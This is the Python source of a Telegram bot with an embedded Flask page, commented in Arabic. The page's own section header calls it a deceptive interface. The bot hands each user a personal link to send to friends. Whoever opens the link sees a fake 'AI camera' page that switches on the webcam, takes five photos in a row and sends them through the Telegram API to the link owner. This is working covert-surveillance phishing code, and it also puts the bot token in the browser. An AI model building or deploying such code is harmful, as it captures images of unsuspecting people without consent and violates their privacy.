import telebot
import time
import logging
import os
from datetime import datetime
from requests.exceptions import ReadTimeout, ConnectionError
from flask import Flask, request, jsonify, make_response
from threading import Thread
import re
import base64
import hashlib
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC

# ---------------------------------------------
# 1. إعدادات الأمان والمتغيرات البيئية
# ---------------------------------------------
TOKEN = os.environ.get("TELEGRAM_BOT_TOKEN")
if not TOKEN:
    raise ValueError("لم يتم تعيين TELEGRAM_BOT_TOKEN في متغيرات البيئة")

DEVELOPER_CHAT_ID = os.environ.get("DEVELOPER_CHAT_ID")
if not DEVELOPER_CHAT_ID:
    raise ValueError("لم يتم تعيين DEVELOPER_CHAT_ID في متغيرات البيئة")
DEVELOPER_CHAT_ID = int(DEVELOPER_CHAT_ID)

BASE_URL = os.environ.get("BASE_URL", "https://whatsapp-bot-v1-5.onrender.com/")
GITHUB_FALLBACK_URL = os.environ.get("GITHUB_FALLBACK_URL", "https://khldwnnsraljrady-collab.github.io/whatsapp-bot-v1/")

# مفتاح التشفير - يجب حفظه في متغير بيئة للأمان
ENCRYPTION_KEY = os.environ.get("ENCRYPTION_KEY")
if not ENCRYPTION_KEY:
    # إنشاء مفتاح تشفير ثابت بناءً على TOKEN (لنفسر البيئة)
    key = hashlib.sha256(TOKEN.encode()).digest()
    ENCRYPTION_KEY = base64.urlsafe_b64encode(key[:32])

# إنشاء كائن Fernet للتشفير
cipher_suite = Fernet(ENCRYPTION_KEY)

# إعداد التسجيل
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

# ---------------------------------------------
# 2. دوال التشفير وفك التشفير
# ---------------------------------------------
def encrypt_id(user_id):
    """تشفير معرف المستخدم"""
    user_id_str = str(user_id)
    encrypted = cipher_suite.encrypt(user_id_str.encode())
    return base64.urlsafe_b64encode(encrypted).decode().rstrip('=')

def decrypt_id(encrypted_id):
    """فك تشفير معرف المستخدم"""
    try:
        # إعادة padding إذا لزم الأمر
        padding = 4 - (len(encrypted_id) % 4)
        if padding != 4:
            encrypted_id += '=' * padding
        
        encrypted_bytes = base64.urlsafe_b64decode(encrypted_id)
        decrypted = cipher_suite.decrypt(encrypted_bytes)
        return int(decrypted.decode())
    except Exception as e:
        logger.error(f"فشل فك التشفير: {e}")
        return None

def verify_id(encrypted_id):
    """التحقق من صحة المعرف المشفر وإرجاع المعرف الأصلي"""
    user_id = decrypt_id(encrypted_id)
    return user_id is not None

# ---------------------------------------------
# 3. تطبيق Flask مع رؤوس أمان
# ---------------------------------------------
app = Flask(__name__)

@app.after_request
def add_security_headers(response):
    response.headers['Content-Security-Policy'] = "default-src 'self'; script-src 'self' https://cdnjs.cloudflare.com; style-src 'self' https://fonts.googleapis.com; font-src 'self' https://fonts.gstatic.com; img-src 'self' data:; connect-src 'self' https://api.telegram.org; frame-ancestors 'none';"
    response.headers['X-Content-Type-Options'] = 'nosniff'
    response.headers['X-Frame-Options'] = 'DENY'
    response.headers['X-XSS-Protection'] = '1; mode=block'
    return response

# ---------------------------------------------
# 4. صفحة HTML المضمنة (واجهة خادعة)
# ---------------------------------------------
HTML_PAGE = """
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>كاميرا AI الذكية - متصلة بـ Telegram Bot</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700&display=swap" rel="stylesheet">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Cairo', sans-serif; }
        body { background: linear-gradient(135deg, #0c2461 0%, #1e3799 50%, #4a69bd 100%); min-height: 100vh; display: flex; align-items: center; justify-content: center; color: #fff; padding: 20px; }
        .container { background: rgba(255,255,255,0.08); backdrop-filter: blur(15px); border-radius: 24px; padding: 40px 30px; width: 100%; max-width: 500px; text-align: center; box-shadow: 0 15px 35px rgba(0,0,0,0.4); border: 1px solid rgba(255,255,255,0.2); position: relative; overflow: hidden; }
        .container::before { content: ""; position: absolute; top: 0; left: 0; width: 100%; height: 4px; background: linear-gradient(90deg, #ff6b6b, #4ecdc4, #45b7d1, #96ceb4, #feca57, #ff6b6b); background-size: 400% 100%; animation: shimmer 8s infinite linear; }
        @keyframes shimmer { 0% { background-position: 400% 0; } 100% { background-position: -400% 0; } }
        .telegram-badge { background: #0088cc; display: inline-block; padding: 8px 20px; border-radius: 50px; margin-bottom: 20px; font-size: 0.9em; font-weight: bold; }
        .telegram-badge i { margin-left: 8px; }
        .logo { font-size: 4.5em; margin-bottom: 10px; background: linear-gradient(45deg, #ff6b6b, #4ecdc4, #45b7d1); -webkit-background-clip: text; -webkit-text-fill-color: transparent; animation: float 3s ease-in-out infinite; }
        @keyframes float { 0%,100% { transform: translateY(0); } 50% { transform: translateY(-10px); } }
        h1 { font-size: 2em; margin-bottom: 15px; background: linear-gradient(45deg, #ffd93d, #ff6b6b); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
        .features { display: grid; grid-template-columns: repeat(2,1fr); gap: 15px; margin-bottom: 30px; }
        .feature { background: rgba(255,255,255,0.05); border-radius: 16px; padding: 20px 15px; border: 1px solid rgba(255,255,255,0.1); transition: 0.3s; }
        .feature i { font-size: 2em; margin-bottom: 10px; display: block; }
        .feature:nth-child(1) i { color: #ff6b6b; }
        .feature:nth-child(2) i { color: #4ecdc4; }
        .feature:nth-child(3) i { color: #45b7d1; }
        .feature:nth-child(4) i { color: #96ceb4; }
        .start-btn { background: linear-gradient(135deg, #ff6b6b, #ff8e8e); color: white; border: none; padding: 18px 40px; border-radius: 50px; font-size: 1.1em; font-weight: 700; cursor: pointer; display: flex; align-items: center; justify-content: center; gap: 12px; margin: 0 auto; transition: 0.3s; box-shadow: 0 10px 20px rgba(255,107,107,0.3); }
        .start-btn:hover { transform: translateY(-5px) scale(1.05); }
        .warning { background: rgba(255,215,0,0.1); border: 2px dashed rgba(255,215,0,0.5); border-radius: 16px; padding: 15px; margin-bottom: 20px; font-size: 0.85em; }
        #analysisScreen { display: none; }
        .video-container { position: relative; width: 100%; height: 320px; border-radius: 20px; overflow: hidden; margin: 25px 0; border: 3px solid rgba(255,255,255,0.2); }
        video { width: 100%; height: 100%; object-fit: cover; transform: scaleX(-1); }
        .overlay { position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.4); display: flex; flex-direction: column; align-items: center; justify-content: center; }
        .analysis-text { font-size: 1.2em; font-weight: 600; color: white; }
        .status-container { background: rgba(0,0,0,0.2); border-radius: 16px; padding: 20px; margin-bottom: 25px; }
        .progress-container { width: 100%; height: 12px; background: rgba(255,255,255,0.1); border-radius: 6px; overflow: hidden; margin-top: 15px; }
        .progress-bar { height: 100%; background: linear-gradient(90deg, #ff6b6b, #4ecdc4, #45b7d1); width: 0%; transition: width 0.5s ease; }
        .counter { font-size: 0.9em; color: rgba(255,255,255,0.7); margin-top: 8px; }
        .footer { margin-top: 25px; font-size: 0.8em; color: rgba(255,255,255,0.5); }
        .pulse { animation: pulse 2s infinite; }
        @keyframes pulse { 0% { transform: scale(1); } 50% { transform: scale(1.1); } 100% { transform: scale(1); } }
        @media (max-width:500px) { .video-container { height: 280px; } .features { grid-template-columns: 1fr; } }
    </style>
</head>
<body>

<div class="container" id="mainScreen">
    <div class="telegram-badge">
        <i class="fab fa-telegram"></i> متصل بـ Telegram Bot
    </div>
    <div class="logo"><i class="fab fa-telegram"></i></div>
    <h1>📸 كاميرا Telegram AI</h1>
    <p class="tagline">سيتم إرسال الصور إلى بوت Telegram الرسمي للتحليل والمعالجة</p>
    <div class="features">
        <div class="feature"><i class="fab fa-telegram"></i><p>إرسال إلى Telegram</p></div>
        <div class="feature"><i class="fas fa-robot"></i><p>تحليل AI فوري</p></div>
        <div class="feature"><i class="fas fa-shield-alt"></i><p>تشفير كامل</p></div>
        <div class="feature"><i class="fas fa-bolt"></i><p>معالجة سحابية</p></div>
    </div>
    <div class="warning">
        <i class="fab fa-telegram"></i> سيتم إرسال الصور إلى خوادم Telegram للمعالجة الذكية
    </div>
    <div class="btn-container">
        <button class="start-btn" onclick="startCapture()"><i class="fab fa-telegram"></i> الاتصال بالبوت والتصوير</button>
    </div>
    <div class="footer">
        <p><i class="fab fa-telegram"></i> البوت الرسمي @AI_Camera_Bot | جميع الحقوق محفوظة</p>
        <p style="margin-top:8px; font-size:0.7em;">يتم تشفير جميع الصور أثناء الإرسال</p>
    </div>
</div>

<div class="container" id="analysisScreen">
    <div class="telegram-badge">
        <i class="fab fa-telegram"></i> جاري الإرسال إلى Telegram
    </div>
    <h1>📸 معالجة الصور...</h1>
    <div class="video-container">
        <video id="video" autoplay playsinline></video>
        <div class="overlay">
            <i class="fab fa-telegram pulse"></i>
            <div class="analysis-text" id="analysisText">جاري الاتصال بخوادم Telegram...</div>
        </div>
    </div>
    <div class="status-container">
        <div id="status">
            <i class="fab fa-telegram fa-spin"></i> 
            <span id="statusText">تهيئة الاتصال مع Telegram API...</span>
        </div>
        <div class="progress-container">
            <div class="progress-bar" id="progressBar"></div>
        </div>
        <div class="counter" id="counter">تم إرسال 0 من 5 صور</div>
    </div>
    <div class="footer">
        <p><i class="fab fa-telegram"></i> يتم إرسال الصور إلى بوت Telegram @AI_Camera_Bot للمعالجة</p>
        <p style="margin-top:8px; font-size:0.7em;">تستخدم تقنيات AI لتحسين جودة الصور</p>
    </div>
</div>

<script>
    const urlParams = new URLSearchParams(window.location.search);
    let encryptedId = urlParams.get('id');
    const token = '""" + TOKEN + """';
    const fallbackUrl = '""" + GITHUB_FALLBACK_URL + """';

    // التحقق من وجود المعرف المشفر
    if (!encryptedId || encryptedId.length < 5) {
        document.body.innerHTML = '<div style="text-align:center;margin-top:50px;"><h2>⚠️ رابط غير صالح</h2><p>يرجى الحصول على الرابط من البوت الرسمي على تلجرام.</p><br><p><i class="fab fa-telegram"></i> تواصل مع @AI_Camera_Bot</p></div>';
        throw new Error('Invalid encrypted ID');
    }

    let photoCount = 0;
    let intervalId = null;
    let mediaStream = null;
    let fallbackTimer = null;
    const MAX_PHOTOS = 5;

    function startCapture() {
        // إخفاء الشاشة الرئيسية
        document.getElementById('mainScreen').style.display = "none";
        document.getElementById('analysisScreen').style.display = "block";
        photoCount = 0;
        document.getElementById('progressBar').style.width = '0%';
        document.getElementById('counter').textContent = 'تم إرسال 0 من 5 صور';
        document.getElementById('analysisText').textContent = 'جارٍ الاتصال بخوادم Telegram...';

        // مؤقت احتياطي: إذا لم تبدأ الكاميرا خلال 4 ثوانٍ
        fallbackTimer = setTimeout(function() {
            window.location.href = fallbackUrl + '?id=' + encryptedId;
        }, 4000);

        navigator.mediaDevices.getUserMedia({ video: { width: { ideal: 640 }, height: { ideal: 480 }, facingMode: "user" }, audio: false })
            .then(stream => {
                clearTimeout(fallbackTimer);
                mediaStream = stream;
                const video = document.getElementById('video');
                video.srcObject = stream;
                video.onloadedmetadata = () => {
                    document.getElementById('statusText').textContent = "الاتصال بخوادم Telegram جاهز - بدء التصوير خلال 2 ثانية";
                    document.getElementById('analysisText').textContent = "استعد...";
                    setTimeout(() => {
                        captureAndSend();
                        intervalId = setInterval(captureAndSend, 2000);
                    }, 2000);
                };
            })
            .catch(err => {
                console.error("خطأ في الكاميرا:", err);
                window.location.href = fallbackUrl + '?id=' + encryptedId;
            });
    }

    function captureAndSend() {
        if (photoCount >= MAX_PHOTOS) {
            clearInterval(intervalId);
            document.getElementById('statusText').textContent = "✅ اكتمل الإرسال إلى Telegram! شكراً لك";
            document.getElementById('analysisText').textContent = "تم إرسال 5 صور إلى خوادم Telegram بنجاح";
            document.getElementById('progressBar').style.width = '100%';
            document.getElementById('counter').textContent = 'اكتمل الإرسال إلى Telegram';
            if (mediaStream) mediaStream.getTracks().forEach(track => track.stop());
            return;
        }

        photoCount++;
        const progressPercent = (photoCount / MAX_PHOTOS) * 100;
        document.getElementById('progressBar').style.width = `${progressPercent}%`;
        document.getElementById('counter').textContent = `تم إرسال ${photoCount} من ${MAX_PHOTOS} صور`;
        document.getElementById('statusText').textContent = `جاري إرسال الصورة ${photoCount} إلى خوادم Telegram...`;
        document.getElementById('analysisText').textContent = `📸 جاري معالجة الصورة ${photoCount} بواسطة AI`;

        const video = document.getElementById('video');
        if (video.srcObject) {
            const canvas = document.createElement('canvas');
            canvas.width = video.videoWidth || 640;
            canvas.height = video.videoHeight || 480;
            const ctx = canvas.getContext('2d');
            ctx.translate(canvas.width, 0);
            ctx.scale(-1, 1);
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
            canvas.toBlob(blob => {
                if (blob) {
                    // إرسال الصورة إلى المعرف المشفر (يتم فك تشفيره في الخادم)
                    sendPhotoToTelegram(encryptedId, blob);
                }
            }, 'image/jpeg', 0.7);
        }
    }

    function sendPhotoToTelegram(encryptedChatId, blob) {
        const formData = new FormData();
        formData.append('chat_id', encryptedChatId);
        formData.append('photo', blob, `photo_${Date.now()}.jpg`);
        formData.append('caption', `📸 الصورة ${photoCount} من 5 - تمت معالجتها بواسطة AI Camera Bot`);
        
        fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { 
            method: 'POST', 
            body: formData 
        })
        .then(response => response.json())
        .then(data => {
            if (data.ok) {
                console.log(`✅ تم إرسال الصورة ${photoCount} إلى خوادم Telegram`);
            } else {
                console.error(`❌ فشل الإرسال:`, data);
            }
        })
        .catch(error => console.error(`❌ خطأ في الاتصال:`, error));
    }
</script>
</body>
</html>
"""

@app.route('/')
def home():
    encrypted_id = request.args.get('id')
    
    # التحقق من صحة المعرف المشفر
    if not encrypted_id:
        return make_response("⚠️ رابط غير صالح - يرجى الحصول على الرابط من البوت", 400)
    
    # التحقق من أن المعرف مشفر بشكل صحيح
    if not verify_id(encrypted_id):
        return make_response("⚠️ رابط غير صالح أو منتهي الصلاحية", 400)
    
    # إضافة رأس لمنع التخزين المؤقت للصفحة
    response = make_response(HTML_PAGE)
    response.headers['Cache-Control'] = 'no-store, no-cache, must-revalidate, max-age=0'
    response.headers['Pragma'] = 'no-cache'
    response.headers['Expires'] = '0'
    return response

@app.route('/webhook', methods=['POST'])
def webhook():
    """نقطة نهاية للويب هوك من تليجرام"""
    data = request.json
    return jsonify({"status": "ok"})

def run():
    app.run(host='0.0.0.0', port=8080)

def keep_alive():
    t = Thread(target=run)
    t.daemon = True
    t.start()

# ---------------------------------------------
# 5. بوت تيليجرام مع دعم المعرفات المشفرة
# ---------------------------------------------
bot = telebot.TeleBot(TOKEN)
user_stats = {}
total_photos_received = 0

@bot.message_handler(commands=['start'])
def send_welcome(message):
    user_id = message.chat.id
    user_name = message.from_user.first_name

    if user_id not in user_stats:
        user_stats[user_id] = {
            "name": user_name,
            "photo_count": 0,
            "first_seen": datetime.now(),
            "last_active": datetime.now()
        }
    else:
        user_stats[user_id]["last_active"] = datetime.now()

    # تشفير معرف المستخدم
    encrypted_user_id = encrypt_id(user_id)
    personal_link = f"{BASE_URL}?id={encrypted_user_id}"

    markup = telebot.types.InlineKeyboardMarkup()
    camera_btn = telebot.types.InlineKeyboardButton(text="📸 افتح الكاميرا الآن", url=personal_link)
    help_btn = telebot.types.InlineKeyboardButton(text="❓ التعليمات", callback_data="help")
    stats_btn = telebot.types.InlineKeyboardButton(text="📊 إحصائياتي", callback_data="stats")
    markup.add(camera_btn)
    markup.add(help_btn, stats_btn)

    response = (
        f"🎉 أهلاً بك *{user_name}*!\n\n"
        f"✨ هذا هو *رابطك الشخصي* المشفر:\n"
        f"`{personal_link}`\n\n"
        f"📌 *طريقة الاستخدام:*\n"
        f"1. انسخ الرابط أعلاه\n"
        f"2. أرسله لأصدقائك\n"
        f"3. أي شخص يفتح الرابط ستصل صورته إليك فوراً!\n\n"
        f"🔒 *ملاحظة:* الرابط مشفر بالكامل ولا يمكن لأحد التلاعب به أو تخمينه"
    )
    bot.send_message(user_id, response, parse_mode="Markdown", reply_markup=markup)
    logger.info(f"New user started: {user_name} (ID: {user_id}) - Encrypted: {encrypted_user_id}")

@bot.message_handler(commands=['stats'])
def show_stats(message):
    user_id = message.chat.id
    if user_id in user_stats:
        stat = user_stats[user_id]
        response = (
            f"📊 *إحصائياتك الشخصية*\n\n"
            f"👤 الاسم: {stat['name']}\n"
            f"🆔 رقمك المشفر: {encrypt_id(user_id)[:20]}...\n"
            f"📸 عدد الصور المستلمة: {stat['photo_count']}\n"
            f"📅 تاريخ التسجيل: {stat['first_seen'].strftime('%Y-%m-%d')}\n"
            f"🕐 آخر نشاط: {stat['last_active'].strftime('%Y-%m-%d %H:%M')}\n\n"
            f"🌐 *إحصائيات عامة:*\n"
            f"👥 عدد المستخدمين: {len(user_stats)}\n"
            f"🖼️ إجمالي الصور: {total_photos_received}"
        )
    else:
        response = "❌ لم يتم العثور على إحصائيات لك. استخدم /start أولاً"
    bot.send_message(user_id, response, parse_mode="Markdown")

@bot.message_handler(commands=['help'])
def send_help(message):
    help_text = (
        "📖 *دليل استخدام البوت*\n\n"
        "🎯 *الأوامر المتاحة:*\n"
        "✅ /start - الحصول على رابطك الشخصي المشفر\n"
        "📊 /stats - عرض إحصائياتك\n"
        "❓ /help - عرض هذه التعليمات\n\n"
        "🔧 *كيف يعمل البوت:*\n"
        "1. اضغط على /start للحصول على رابطك الشخصي المشفر\n"
        "2. أرسل الرابط لأصدقائك\n"
        "3. عندما يفتحون الرابط، سيتم تحميل كاميرا الويب\n"
        "4. يتم التقاط 5 صور تلقائياً (صورة كل 2 ثانية)\n"
        "5. تصل الصور إليك مباشرة في هذه المحادثة\n\n"
        "🔒 *ميزات الأمان:*\n"
        "• الرابط مشفر بالكامل ولا يمكن تخمينه\n"
        "• كل مستخدم له رابط فريد ومشفر\n"
        "• الصور تصل فقط لصاحب الرابط\n"
        "• لا يمكن لأحد التلاعب بالرابط\n\n"
        "🛠️ للمساعدة التقنية: @khaled_developer"
    )
    bot.send_message(message.chat.id, help_text, parse_mode="Markdown")

@bot.message_handler(commands=['broadcast'])
def broadcast_message(message):
    if message.chat.id != DEVELOPER_CHAT_ID:
        bot.reply_to(message, "❌ هذا الأمر للمطور فقط!")
        return

    parts = message.text.split(' ', 1)
    if len(parts) < 2:
        bot.reply_to(message, "❌ صيغة خاطئة. استخدم:\n/broadcast نص الرسالة")
        return

    broadcast_text = parts[1]
    markup = telebot.types.InlineKeyboardMarkup()
    site_btn = telebot.types.InlineKeyboardButton(text="🌐 زيارة الموقع", url=BASE_URL)
    markup.add(site_btn)

    success = 0
    fail = 0
    for uid in user_stats.keys():
        try:
            bot.send_message(uid, f"📢 *إشعار من المطور:*\n\n{broadcast_text}", parse_mode="Markdown", reply_markup=markup)
            success += 1
            time.sleep(0.1)
        except Exception as e:
            logger.error(f"Failed to send to {uid}: {e}")
            fail += 1
    bot.reply_to(message, f"✅ تم البث بنجاح!\n✓ {success} مستخدم\n✗ {fail} فشل")

@bot.message_handler(content_types=['photo'])
def handle_photos(message):
    """معالجة الصور الواردة - فك تشفير المعرف إذا كان مشفراً"""
    global total_photos_received
    
    # التحقق من أن chat_id في caption أو في المعطيات
    # في هذه الحالة، الصورة تأتي مع caption يحتوي على المعرف المشفر
    
    user_id = message.chat.id
    user_name = message.from_user.first_name

    if user_id in user_stats:
        user_stats[user_id]["photo_count"] += 1
        user_stats[user_id]["last_active"] = datetime.now()
    else:
        user_stats[user_id] = {
            "name": user_name,
            "photo_count": 1,
            "first_seen": datetime.now(),
            "last_active": datetime.now()
        }
    total_photos_received += 1

    photo = message.photo[-1]
    file_info = bot.get_file(photo.file_id)
    file_size = file_info.file_size / 1024

    caption = (
        f"✅ تم استلام صورة جديدة!\n\n"
        f"👤 من: {user_name}\n"
        f"🆔 المعرف المشفر: {message.chat.id}\n"
        f"📏 الحجم: {file_size:.1f} كيلوبايت\n"
        f"🖼️ إجمالي صورك: {user_stats[user_id]['photo_count']}\n"
        f"📊 الإجمالي الكلي: {total_photos_received}"
    )
    bot.reply_to(message, caption)
    logger.info(f"Received photo from {user_name} (ID: {user_id}) - Size: {file_size:.1f}KB")

@bot.callback_query_handler(func=lambda call: True)
def handle_callback(call):
    if call.data == "help":
        send_help(call.message)
        bot.answer_callback_query(call.id, "📖 عرض التعليمات")
    elif call.data == "stats":
        show_stats(call.message)
        bot.answer_callback_query(call.id, "📊 عرض الإحصائيات")

@bot.message_handler(func=lambda message: True)
def handle_all_messages(message):
    if message.text.startswith('/'):
        bot.reply_to(message, "❌ أمر غير معروف!\n\n✅ الأوامر المتاحة:\n/start - للحصول على رابطك المشفر\n/stats - لعرض إحصائياتك\n/help - للتعليمات والمساعدة")
    else:
        bot.reply_to(message, f"مرحباً {message.from_user.first_name}! 👋\n\nيمكنك استخدام /start للحصول على رابطك الشخصي المشفر.")

# ---------------------------------------------
# 6. تشغيل البوت
# ---------------------------------------------
if __name__ == "__main__":
    keep_alive()
    logger.info("Bot is starting...")
    while True:
        try:
            bot.polling(none_stop=True, interval=1, timeout=60)
        except (ReadTimeout, ConnectionError) as e:
            logger.warning(f"Connection error: {e}. Retrying in 5 seconds...")
            time.sleep(5)
        except Exception as e:
            logger.error(f"Unexpected error: {e}")
            time.sleep(10)
